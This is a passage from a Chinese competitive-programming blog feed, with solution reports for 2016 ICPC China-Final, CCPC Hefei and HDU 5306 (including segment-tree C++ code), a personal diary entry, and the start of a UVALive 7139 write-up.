class="comment">%MO+MO)%MO;</span></div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    init();</div><div class="line">    int n,m;</div><div class="line">    while (scanf(<span class="string">"%d%d"</span>,&amp;n,&amp;m)!=<span class="symbol">EOF</span>) &#123;</div><div class="line">        printf(<span class="string">"%lld\n"</span>,dp[n][m]);</div><div class="line">    &#125;</div><div class="line">    return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2016 China-Final 解题报告</title>
      <url>/blog/2017/02/23/2016-cnfinal/</url>
      <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2016/12/11/china_final" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del><br>这几天又把China-Final的题补了一些，比较蛋疼的是为啥根本搜不到题解。。。我觉得我要多加些关键字，2016 ICPC China-Final，<a href="http://codeforces.com/gym/101194" target="_blank" rel="noopener">codeforces gym101194</a>。题目在cf可以交，因为只有PDF就不每一题都加链接了。</p><h3 id="A-Number-Theory-Problem"><a href="#A-Number-Theory-Problem" class="headerlink" title="A.  Number Theory Problem"></a>A.  Number Theory Problem</h3><p>$7$的二进制表示为$111$，所以$111$, $1110$($111$移位的结果)都能被$7$整除。而$2^k-1$的二进制表示为$\underbrace{11\dots1}_{k\text{ times}}$。所以只需要$k$被$3$整除即可。</p><h3 id="C-Mr-Panda-and-Strips"><a href="#C-Mr-Panda-and-Strips" class="headerlink" title="C. Mr. Panda and Strips"></a>C. Mr. Panda and Strips</h3><p>这题据说比赛的时候$O(n^4)$加优化就能过。。。反正我们也没试。。。<br>我最开始看到的是出题人的题解，消化了很久并且按照他讲的写了，结果WA了以后仔细改了改又TLE了。然后再回去看他的题解，感觉错误不止一个啊。。。= =<br>我出于无奈只好直接问q巨要了一份代码。。。<br><a href="https://github.com/Smlight/ACMer/blob/master/2016/12/11/China-Final/C_Q.cpp" target="_blank" rel="noopener">C_Q.cpp</a><br>这个代码的意思大概就是先预处理每个颜色分布在哪几个位置，每个位置最多能延伸的区间。然后枚举第一个区间的右边界$i$，再枚举左边界$j$，$j$每减小1，就用新加入的颜色$a[j]$在之后出现的位置$x$（即$a[x]==a[j], x&gt;j$）去截保存在set里的一些区间（所有满足 $l\leq x \leq r$ 的区间）。对于每一个$x$，在全截完了以后再插入在$x$左边的最长的$[ml,x-1]$，在$x$右边的最长的$[x+1,mr]$。代码中<code>multiset&lt;int&gt; len</code>是辅助的保存长度的有序列。<br>这个算法对于每一个$i$都是先插入$O(n)$个区间，对于每个区间又会分割成$O(n)$个区间，显然复杂度是$O(n^3logn)$。时间达到了3.5s，常数比较大，操作的区间总个数更接近于$4n^2$。<br>后来又看到一份代码（是cf上的vj号交的，所以也不知道是哪位大侠）感觉很不错，跟这个其实是一个思路的，于是就学习了一下。<br>预处理时采用了时间戳的int数组，也可以像上面那样每次清空bool数组。<br><a href="https://github.com/Smlight/ACMer/blob/master/2016/12/11/China-Final/C.cpp" target="_blank" rel="noopener">C.cpp</a><br>这个方法更优的地方在于它并没有一定要保存合法的区间（如$[1,n]$通常不合法），它保存的是<strong>相对于第一个区间合法的区间</strong>，以及<strong>该区间内自我合法的最大长度</strong>。<br>复杂度同样为$O(n^3logn)$，但是实际操作区间接近$2n^2$，所以运行时间也大概是一半。</p><h3 id="D-Ice-Cream-Tower"><a href="#D-Ice-Cream-Tower" class="headerlink" title="D. Ice Cream Tower"></a>D. Ice Cream Tower</h3><p>这题应该说比较容易。读懂题目应该可以想到答案具有单调性，所以可以二分答案。记二分当前结果为$m$，那么问题转化为判定能不能堆出$m$个塔。这个也比较容易，我们只要将冰淇淋按从小到大排序，一层一层贪心地堆就可以了，因为这个冰淇淋如果当前不能用上，那么后续更不可能用上。（从大到小堆我没有测试，据说也可以通过）<br>不想动态申请内存的可以像这样使用滚动数组。</p><h3 id="E-Bet"><a href="#E-Bet" class="headerlink" title="E. Bet"></a>E. Bet</h3><p>。。。这题本身是容易的。。。但是。。。<br>记对第$i$个赌局下注$c_i$，则题意就是对于答案集合$S$中的每个$i$都有$$c_i+c_i*\cfrac{b_i}{a_i}&gt;\sum^{i\in S}_{i}c_i\quad=&gt;\quad \cfrac{c_i}{\sum^{i\in S}_{i}c_i}&gt;\cfrac{a_i}{a_i+b_i}$$该式对$i$求和可得$\sum^{i\in S}_{i}\cfrac{a_i}{a_i+b_i}&lt;1$。接下来排个序贪个心就不用说了吧。。。然而boss却是精度问题。。。多少队伍交了10+发就是因为精度问题。。。反正听说有1-(1e-50)的= =<br>于是我又是问q巨要的代码。。。然后我感觉Java很厉害。。。</p><h3 id="F-Mr-Panda-and-Fantastic-Beasts"><a href="#F-Mr-Panda-and-Fantastic-Beasts" class="headerlink" title="F. Mr. Panda and Fantastic Beasts"></a>F. Mr. Panda and Fantastic Beasts</h3><p>比赛的时候还什么都不会。。。现在知道可以用后缀数组或者后缀自动机做，先只学后缀数组吧。。。<br>这么多串第一步就是加特殊字符全连在一起，用倍增法实现SA。记第一个串为$S_1$，对于起点在$S_1$的每一个后缀$suffix(i)$，如果按字典序向前找到第一个不始于S1的后缀$suffix(p)$（位置越近重合长度越长），那么要想答案串在$S_1$之外的串中不出现，长度至少要$lcp(suffix(i),suffix(p))+1$，同理向后找，找到$suffix(q)$，长度至少要$lcp(suffix(i),suffix(q))+1$，所以用两者的最大值更新答案长度。注意，这个答案长度不能超过$S_1$剩下的部分！<br><strong>The solution above is based on forever97’ s.</strong><br>至于$lcp$可以用ST实现的RMQ，但是因为本来就是线性向前向后找，实际上使用最原始的一连串$height$值的最小值就可以啦。这个方法反而跑得飞快，10s的题在cf上只用了400+ms，复杂度我不太会分析。。。= =<br><a href="https://github.com/Smlight/ACMer/blob/master/2016/12/11/China-Final/F.cpp" target="_blank" rel="noopener">F.cpp</a><br><em>warning: 不赞成使用 height[0]/height[n+1] 。</em></p><h3 id="H-Great-Cells"><a href="#H-Great-Cells" class="headerlink" title="H. Great Cells"></a>H. Great Cells</h3><p>拆开来用贡献做实在是太神奇了。。。dp+容斥不太适合我的能力。。。<br>$$\sum^{NM}_{g=0}\ (g+1)\cdot A_g=\sum^{NM}_{g=0}\ g\cdot A_g+\sum^{NM}_{g=0}\ A_g$$第一项相当于每个格子当一次<strong>great cell</strong>就计数一次，第二项相当于所有填法的总和。<br>$$\sum^{NM}_{g=0}\ g\cdot A_g=NM\cdot contrib=NM\cdot \sum^{K}_{i=2}(i-1)^{N-1+M-1}\cdot K^{(N-1)(M-1)}$$第一项转化为每一个格子的贡献（当<strong>great cell</strong>的次数）。一个格子为<strong>great cell</strong>当且仅当这个格子填$i$时，它所在的行和列填的都是小于$i$的数($(i-1)^{N-1+M-1}$)，其他格子随便填($K^{(N-1)(M-1)}$)。注意，$N=1, M=1$需要另外讨论！<br>于是这道题成为了本场代码第二短的。。。</p><h3 id="L-World-Cup"><a href="#L-World-Cup" class="headerlink" title="L. World Cup"></a>L. World Cup</h3><p>总共六场比赛，每场三种结果，暴力。</p><h3 id="Coda"><a href="#Coda" class="headerlink" title="Coda"></a>Coda</h3><p>因为总是搜不到题解，于是就劳烦了好多人。。。但是大佬们都很友好，作为一个鶸我真的非常感动，值得学习！<br>特别鸣谢 <strong>quailty, forever97</strong> <del>我q人见人爱！</del></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2016 CCPC 合肥站 解题报告</title>
      <url>/blog/2017/02/18/2016-ccpc-hefei/</url>
      <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2016/10/16/ccpc_hefei" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del><br>前几天终于把合肥的题补了一些。。。再往下就是lct了，暂时不学。</p><h3 id="A、传递"><a href="#A、传递" class="headerlink" title="A、传递"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5961" target="_blank" rel="noopener">A、传递</a></h3><p>题解：将P图和Q图的边取并生成一个新图（下称“合成”），有环则原来是不传递的。再将P图和Q的反图合成，有环则原来不传递的。<br>感觉知道结论还是不难理解的。。。反正我根本想不到。。。结束的时候听到有用最短路做的，这个才是重大失误，我们都没想到。<br>代码是按题解写的。</p><h3 id="C、朋友"><a href="#C、朋友" class="headerlink" title="C、朋友"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5963" target="_blank" rel="noopener">C、朋友</a></h3><p>分析：不与根相连的值为1的边操作两次可以变为0，与根相连的值为1的边操作一次可以变为0。推理可知，答案仅和与根直接相连的那些1有关。</p><h3 id="D、平行四边形"><a href="#D、平行四边形" class="headerlink" title="D、平行四边形"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5964" target="_blank" rel="noopener">D、平行四边形</a></h3><p>全场代码最短的题。。。我一直以为它代码是个几何题，好像读题的时候直接跳过了。。。现在发现只要敢做就能做出来= = 又是一个重大失误。<br>这题主要是一个数学推导的题目。。。<br>取两点 $v_1,v_2\in S,v_1\neq v_2$，可以利用平行四边形性质解得直线上的两点 $v_3,v_4$ 。<br>$$\begin{cases}<br>x_1+x_2=x_3+x_4 \\<br>y_1+y_2=y_3+y_4 \\<br>ax_3+by_3=0 \\<br>a’x_4+b’y_4=0<br>\end{cases}$$解得：$$\begin{cases}<br>x_3=\cfrac{a′bx_1+a′bx_2+bb′y_1+bb′y_2}{a′b-ab’} \\<br>y_3=\cfrac{aa′x_1+aa′x_2+ab′y_1+ab′y_2}{ab′-a′b}<br>\end{cases}$$再利用叉积计算面积：$$S=2\times \frac{1}{2}\times |\overrightarrow{v_1v_2}×\overrightarrow{v_1v_3}|=|(x_2-x_1)(y_3-y_1)-(y_2-y_1)(x_3-x_1)| \\<br>=|(ax_2+by_2)(a′x_2+b′y_2)-(ax_1+by_1)(a′x_1+b′y_1)|\triangleq |f(v_2)-f(v_1)|$$</p><h3 id="E、扫雷"><a href="#E、扫雷" class="headerlink" title="E、扫雷"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5965" target="_blank" rel="noopener">E、扫雷</a></h3><p>相邻两格的差等于外面两列的差，直接递推。要特判 $n=1$ 的情况。</p><h3 id="H、异或密码"><a href="#H、异或密码" class="headerlink" title="H、异或密码"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5968" target="_blank" rel="noopener">H、异或密码</a></h3><p>直接暴力。</p><h3 id="I、最大的位或"><a href="#I、最大的位或" class="headerlink" title="I、最大的位或"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5969" target="_blank" rel="noopener">I、最大的位或</a></h3><p>简单的来说，应该使$x(l\leq x\leq r)$与$r$或运算后尽可能将$r$高位的0变为1。</p><h3 id="J、最大公约数"><a href="#J、最大公约数" class="headerlink" title="J、最大公约数"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5970" target="_blank" rel="noopener">J、最大公约数</a></h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">函数 f(x, y):</div><div class="line">&#123;</div><div class="line">     <span class="attr">c=0</span></div><div class="line">     当 y&gt;<span class="number">0</span>:</div><div class="line">     &#123;</div><div class="line">          c +=<span class="number">1</span></div><div class="line">          <span class="attr">t</span> = x % y</div><div class="line">          <span class="attr">x</span> = y</div><div class="line">          <span class="attr">y</span> = t</div><div class="line">      &#125;</div><div class="line">      返回 c * x * x</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>首先题目中给出的这个函数核心很像gcd，我们可以看出它的一个性质：<code>f(u,y)==f(v,y), if u==v (mod y)</code> 。这个性质是很显然的，因为这个函数的第一步就是 <code>t = x % y</code> <del>然而我并没有看出来</del>。<br>所以，在该式$\lfloor \frac{i*j}{f(i,j)}\rfloor$中先枚举$j$，再枚举$i(1\leq i\leq j)$，此时其实每一个$i$都对应一个等差数列${i,i+j,i+2j,\dots}$ 。当然这题没这么简单，还有一个向下取整没有考虑。<br>将计算$f(x,y)$过程中的$c$值记为$c(x,y)$，则有$f(i,j)=c(i,j)(gcd(i,j))^2$。考虑把一个$i$对应的数列拆分成多个数列使得取整后仍为等差，可以发现当新的数列的公差为$c(i,j)*j$时，整个分式的公差为$\frac{(c(i,j)*j)*j}{f(i,j)}=(\frac{j}{gcd(i,j)})^2$，必为整数。因此，我们把数列拆分为${i,i+c(i,j)*j,\dots}$, ${i+j,i+j+c(i,j)*j,\dots}\dots$, 共$c(i,j)$个，分别使用求和公式即可。</p><p>最后贴一下坎普的题解。。。总共10个题都有 <a href="https://post.icpc-camp.org/d/628-2016" target="_blank" rel="noopener">https://post.icpc-camp.org/d/628-2016</a></p><p>=========2016/02/20=========</p><p>这篇博客本来写了我一个下午。。。结果今天发现它出了点问题了。。。又补了一个晚上。。。哭死了。。。第一次这么感谢百度快照。。。</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5306 Gorgeous Sequence 线段树</title>
      <url>/blog/2017/02/03/hdu5306/</url>
      <content type="html"><![CDATA[<h3 id="Gorgeous-Sequence"><a href="#Gorgeous-Sequence" class="headerlink" title="Gorgeous Sequence"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5306" target="_blank" rel="noopener">Gorgeous Sequence</a></h3><p>读完题，可以知道显然要维护最大值和区间和，可以用线段树。写着写着感觉第一种操作好像不能延迟更新，然后就不会了。。。<br>查题解的时候发现都是线段树，不过各有各的做法，后来有一种说是吉如一论文中介绍的，可以证明每次操作均摊复杂度为 $O(logN)$ 。这个论文的标题我倒是找到了（吉如一 -《区间最值操作与历史最值问题》）然而论文没找到。。。<br>做法如下：线段树的每个节点记录最大值a，次大值b，区间和sum，以及最大值个数cnt。当进行第一种操作时，</p><ol><li>如果当前节点有 $a \leq t$ ，则直接退出。这个很好理解，即区间内所有数都不变。</li><li>如果当前节点有 $b \lt t$，则先利用 $a$ 和 $cnt$ 更新$sum$ 再更新 $a$ 后退出。这里要注意的是绝对不能加等号！若 $b=t$ 也是如此退出，则之后的次大值和最大值个数都不准确【没错我就是因为这个WA了几次 ←_←</li><li>直接往下递归</li></ol><p>第二种第三种为线段树常规的操作，不表。<br>期间还发生一件事，找了一份3k+的代码边抄边理解然后调了半天终于A了，结果又找到一份代码，感觉非常好懂而且只有2k+，于是又照着这个写了一遍。。。可见理思路是多么的重要。。。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#include &lt;bits/stdc++.h&gt;</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="title">std</span>;</div><div class="line">typedef <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line">typedef pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; PII;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> lson l,m,rt&lt;&lt;1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> rson m+1,r,rt&lt;&lt;1|1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ls rt&lt;&lt;1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> rs rt&lt;&lt;1|1</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000000</span>;</div><div class="line"><span class="keyword">struct</span> Seg &#123;</div><div class="line">    ll sum;</div><div class="line">    <span class="keyword">int</span> a,b,cnt;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">spfy</span>(<span class="params"><span class="keyword">int</span> t</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (a&lt;=t) <span class="keyword">return</span>;</div><div class="line">        sum-=(ll)(a-t)*cnt;</div><div class="line">        a=t;</div><div class="line">    &#125;</div><div class="line">&#125; s[maxn&lt;&lt;<span class="number">2</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_up</span>(<span class="params"><span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    s[rt].sum=s[ls].sum+s[rs].sum;</div><div class="line">    s[rt].a=max(s[ls].a,s[rs].a);</div><div class="line">    s[rt].b=max(s[ls].b,s[rs].b);</div><div class="line">    s[rt].cnt=<span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (s[ls].a==s[rt].a) s[rt].cnt+=s[ls].cnt;</div><div class="line">    <span class="keyword">else</span> s[rt].b=max(s[rt].b,s[ls].a);</div><div class="line">    <span class="keyword">if</span> (s[rs].a==s[rt].a) s[rt].cnt+=s[rs].cnt;</div><div class="line">    <span class="keyword">else</span> s[rt].b=max(s[rt].b,s[rs].a);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_down</span>(<span class="params"><span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    s[ls].spfy(s[rt].a);</div><div class="line">    s[rs].spfy(s[rt].a);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span>(<span class="params"><span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l==r) &#123;</div><div class="line">        scanf(<span class="string">"%d"</span>,&amp;s[rt].a);</div><div class="line">        s[rt].sum=s[rt].a;</div><div class="line">        s[rt].b=<span class="number">-1</span>;</div><div class="line">        s[rt].cnt=<span class="number">1</span>;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">    build(lson);</div><div class="line">    build(rson);</div><div class="line">    push_up(rt);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span>(<span class="params"><span class="keyword">int</span> L,<span class="keyword">int</span> R,<span class="keyword">int</span> t,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (s[rt].a&lt;=t) <span class="keyword">return</span>;</div><div class="line">    <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R&amp;&amp;s[rt].b&lt;t) &#123;<span class="comment">/* Do not add '=' !!! </span></div><div class="line">        if s[rt].b == t, </div><div class="line">        it supposed to be push_down, </div><div class="line">        because s[rt].b, s[rt].cnt cannot be determined. */</div><div class="line">        s[rt].spfy(t);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    push_down(rt);</div><div class="line">    <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (L&lt;=m&amp;&amp;s[ls].a&gt;t) update(L,R,t,lson);</div><div class="line">    <span class="keyword">if</span> (R&gt;m&amp;&amp;s[rs].a&gt;t) update(L,R,t,rson);</div><div class="line">    push_up(rt);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmax</span>(<span class="params"><span class="keyword">int</span> L,<span class="keyword">int</span> R,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) <span class="keyword">return</span> s[rt].a;</div><div class="line">    <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">    push_down(rt);</div><div class="line">    <span class="keyword">if</span> (L&lt;=m) res=max(res,getmax(L,R,lson));</div><div class="line">    <span class="keyword">if</span> (m&lt;R) res=max(res,getmax(L,R,rson));</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">getsum</span>(<span class="params"><span class="keyword">int</span> L,<span class="keyword">int</span> R,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> rt</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) <span class="keyword">return</span> s[rt].sum;</div><div class="line">    <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">    ll res=<span class="number">0</span>;</div><div class="line">    push_down(rt);</div><div class="line">    <span class="keyword">if</span> (L&lt;=m) res+=getsum(L,R,lson);</div><div class="line">    <span class="keyword">if</span> (m&lt;R) res+=getsum(L,R,rson);</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,m;</div><div class="line">    scanf(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        scanf(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        build(<span class="number">1</span>,n,<span class="number">1</span>);</div><div class="line">        <span class="keyword">while</span> (m--) &#123;</div><div class="line">            <span class="keyword">int</span> op,x,y;</div><div class="line">            scanf(<span class="string">"%d%d%d"</span>,&amp;op,&amp;x,&amp;y);</div><div class="line">            <span class="keyword">if</span> (op==<span class="number">0</span>) &#123;</div><div class="line">                <span class="keyword">int</span> t;</div><div class="line">                scanf(<span class="string">"%d"</span>,&amp;t);</div><div class="line">                update(x,y,t,<span class="number">1</span>,n,<span class="number">1</span>);</div><div class="line">            &#125; <span class="function"><span class="keyword">else</span> <span class="title">if</span> (<span class="params">op==<span class="number">1</span></span>) </span>&#123;</div><div class="line">                printf(<span class="string">"%d\n"</span>,getmax(x,y,<span class="number">1</span>,n,<span class="number">1</span>));</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                printf(<span class="string">"%lld\n"</span>,getsum(x,y,<span class="number">1</span>,n,<span class="number">1</span>));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Piece0</title>
      <url>/blog/2016/12/20/piece0/</url>
      <content type="html"><![CDATA[<p>某文，很6 。<br>昨天在某群看到一个同级同专业的同学解答了折半查找的问题，感觉代码写得挺不错的，而且跟别人争辩的时候也不慌不忙。再一看截图，这环境好像是iPad+vim。。。瞬间吓尿，又想起来他这几次比赛好像都很不错，于是赶紧加了好友。<br>一加好友他竟然说我银牌大佬，还告诉我是AA说的<del>AA真是看得起我😂</del>。后来又了解到他考过pat乙级和pat甲级，甲级80+，凭我感觉应该还是挺屌的。再后来就问问他日常什么系统啊之类的。。。结果发现他每天晚上的日常是<strong>躺在床上拿iPad连接自己桌上的笔记本然后…用vim写代码</strong><br>Cool！妈的感觉这才是大学生啊！当然，首先我需要一个iPad 。<br>又问了问有没有搞过Web方面的，他说用python爬过10个G的<del>美女</del>图片。<br>Cool！妈的感觉这才是大学生啊！当然，首先我需要学会python 。<br>于是我说我想学python ，他就说我这儿有几本书你要不要看啊 。商量了一下，我就直接去他寝室了。<br>见面当然还是要聊啊，中学没搞过信息学竞赛，但是自学过C语言，大学还玩过单片机，然后转专业到计算机，现在在看算法导论，还在跟别人一起搞3D玩。相比之下我就很挫了，初中用Pascal搞信息学竞赛，高中用C++搞信息学竞赛，python只会helloworld，从来没看过什么正经书…<br>轻松转专业，估计还是个学霸。我觉得他就是我想要的那种状态，但是也很难说清楚。不过我现在有事干了：</p><ul><li>看看这本python核心编程</li><li>学会最基本的vim用法<del>要不然怎么搞服务器啊</del></li><li>程序竞赛全面使用c++11，多吸取优雅写法【我觉得一定会很爽</li></ul>]]></content>
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>UVALive 7139 Rotation</title>
      <url>/blog/2016/12/09/UVALive7139/</url>
      <content type="html"><![CDATA[<h3 id="Rotation"><a href="#Rotation" class="headerlink" title="Rotation"></a><a href="https://vjudge.net/problem/UVALive-7139" target="_blank" rel="noopener">Rotation</a></h3><p>题意：$N×M$ 的网格图，给定一条网格线连成的闭合路径，计算所有格子转动值的平方和。假设一辆车沿着路径移动，一个人站在某个格子正中间<strong>始终</strong>对着车，这个人在车开始到停下顺时针转动了 $x$ 度，则他的转动值为 $\frac{x}{360}$ （可以为负数）。<br>题解：首先，因为起点和终点相同，每个格子的转动值一定为整数。<br>其次，若路径为简单环，环内的格子转动值均为 $\pm 1$，环外的格子转动值均为 $0$ 。</p><p><img src="http://img.blog.csdn.net/20161209091839595" alt="环外某格的转动值一定为0"><br>接着可以发现，每次路径向下时，为左边的格子贡献正的转动值，为右边的格子贡献负的转动值。<br>用一个<del>看来的</del>巧妙的做法：每次只考虑路径对右侧的格子的影响。上行一次，右侧所有格子加一，下行一次，右侧所有格子减一。这时，这个做法已经不仅限于简单环了。<br>现在问题转化为给一个矩阵增量，由于只需要最后结果，我们可以利用差分的思想。<br>在一维时，差分可以将区间增量变成两个点的增量。差分即为前缀和的逆运算，回忆一下二维前缀和的递推：$$sum[i][j]=a[i][j]+sum[i-1][j]+sum[i][j-1]-sum[i-1][j-1]$$</p><p>设计如下的增量：</p><p><img src="http://img.blog.csdn.net/20161209093512781" alt="二维的差分"></p><p>进行二维前缀和递推以后即可得到真实的数。</p><p>考虑到本题每次更新的矩阵都是直到右边界，所以可以忽略右边的两个增量。</p><p>最后，本题需要生成一个长宽不定的矩阵，C++使用 vector 比较方便，C语言查了一下指针和malloc大概要十多行吧。。。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 